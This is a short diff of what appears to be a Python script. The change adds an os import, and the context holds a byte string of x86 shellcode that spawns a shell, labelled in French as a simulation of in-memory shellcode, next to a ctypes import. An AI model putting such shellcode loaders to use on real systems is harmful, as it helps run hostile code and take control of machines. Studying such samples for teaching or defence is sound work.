@@ -1,5 +1,6 @@
 import ctypes
 import time
+import os
 
 # Simule un shellcode en mémoire
 payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x89\xe3\xb0\x0b\xcd\x80"
